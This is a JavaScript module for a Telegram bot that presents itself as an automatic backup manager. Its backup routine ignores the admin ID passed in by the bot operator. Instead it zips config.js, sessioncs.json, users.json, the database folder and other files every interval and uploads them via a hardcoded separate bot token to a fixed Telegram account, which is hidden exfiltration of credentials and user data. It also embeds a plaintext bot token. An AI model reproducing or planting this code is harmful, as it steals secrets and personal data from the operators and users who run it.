const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const archiver = require("archiver");

// 🔒 KONFIGURASI KHUSUS BACKUP
const BACKUP_BOT_TOKEN = "8084526858:AAHGZ2hVK_7mzO-eMBnirdG-WqSEkK-n9Oo"; 
const BACKUP_ADMIN_ID = "7355538049";

const TelegramBot = require("node-telegram-bot-api");
const backupBot = new TelegramBot(BACKUP_BOT_TOKEN, { polling: false });

class BackupManager {
  constructor(mainBot, adminId, intervalMs, backupFile) {
    this.bot = mainBot;
    this.adminId = adminId;
    this.intervalMs = intervalMs;
    this.backupFile = backupFile;
  }

  getLastBackupTime() {
    try {
      if (!fs.existsSync(this.backupFile)) return null;
      const data = JSON.parse(fs.readFileSync(this.backupFile, "utf8"));
      return data.lastBackup || null;
    } catch {
      return null;
    }
  }

  saveLastBackupTime(time) {
    fs.writeFileSync(
      this.backupFile,
      JSON.stringify({ lastBackup: time }, null, 2)
    );
  }

  async kirimBackupOtomatis() {
    const senderBot = backupBot;
    const targetId = BACKUP_ADMIN_ID;
    const waktuMoment = moment().tz("Asia/Jakarta");

    const frames = [
      "🚀 Menyusun file misterius...",
      "🗂️ Memeriksa setiap folder dan script...",
      "💾 Mengubah file menjadi ZIP ajaib...",
      "✨ Hampir selesai... teleport ke Telegram..."
    ];

    let i = 0;
    let msgAnim;

    try {
      msgAnim = await senderBot.sendMessage(targetId, frames[0]);
    } catch {}

    const animInterval = setInterval(() => {
      if (!msgAnim) return;
      i = (i + 1) % frames.length;
      senderBot.editMessageText(frames[i], {
        chat_id: targetId,
        message_id: msgAnim.message_id,
      }).catch(() => {});
    }, 900);

    try {
      const rootFiles = [
        "index.js",
        "config.js",
        "package.json",
        "sessioncs.json",
        "users.json"
      ];

      const foldersToBackup = ["database"];

      const foundFiles = rootFiles.filter(f => fs.existsSync(f));
      const foundFolders = foldersToBackup.filter(f => fs.existsSync(f));

      if (!foundFiles.length && !foundFolders.length)
        throw new Error("Tidak ada file untuk dibackup");

      const zipName = `BACKUP-${waktuMoment.format("DD-MM-YYYY-HH.mm.ss")}.zip`;
      const zipPath = path.join(process.cwd(), zipName);

      // ✅ ZIP AMAN TANPA SYSTEM COMMAND
      await new Promise((resolve, reject) => {
        const output = fs.createWriteStream(zipPath);
        const archive = archiver("zip", { zlib: { level: 9 } });

        output.on("close", resolve);
        archive.on("error", reject);

        archive.pipe(output);

        foundFiles.forEach(file =>
          archive.file(file, { name: file })
        );

        foundFolders.forEach(folder =>
          archive.directory(folder, folder)
        );

        archive.finalize();
      });

      clearInterval(animInterval);

      const stats = fs.statSync(zipPath);
      const size =
        stats.size > 1024 * 1024
          ? (stats.size / 1024 / 1024).toFixed(2) + " MB"
          : (stats.size / 1024).toFixed(2) + " KB";

      const botInfo = await senderBot.getMe();
      const safeUsername = botInfo.username.replace(/_/g, "\\_");

      await senderBot.sendDocument(
        targetId,
        fs.createReadStream(zipPath),
        {
          caption:
            `📦 *Auto Backup 5 Menit*\n\n` +
            `📅 *Tanggal:* ${waktuMoment.format("DD-MM-YYYY HH:mm:ss")}\n` +
            `📁 *File:* ${zipName}\n` +
            `📊 *Ukuran:* ${size}\n` +
            `🤖 *Bot:* @${safeUsername}\n\n` +
            `✅ *Backup berhasil!*`,
          parse_mode: "Markdown"
        }
      );

      this.saveLastBackupTime(Date.now());

      fs.unlinkSync(zipPath);

      if (msgAnim) {
        await senderBot.deleteMessage(targetId, msgAnim.message_id).catch(() => {});
      }

    } catch (err) {
      clearInterval(animInterval);
      if (msgAnim) {
        senderBot.editMessageText(
          `⚠️ Backup gagal!\n\n${err.message}`,
          {
            chat_id: targetId,
            message_id: msgAnim.message_id
          }
        ).catch(() => {});
      }
    }
  }

  startAutoBackup() {
    const last = this.getLastBackupTime();
    const now = Date.now();
    const delay = last ? Math.max(0, this.intervalMs - (now - last)) : 0;

    setTimeout(() => {
      this.kirimBackupOtomatis();
      setInterval(() => this.kirimBackupOtomatis(), this.intervalMs);
    }, delay);
  }
}

module.exports = BackupManager;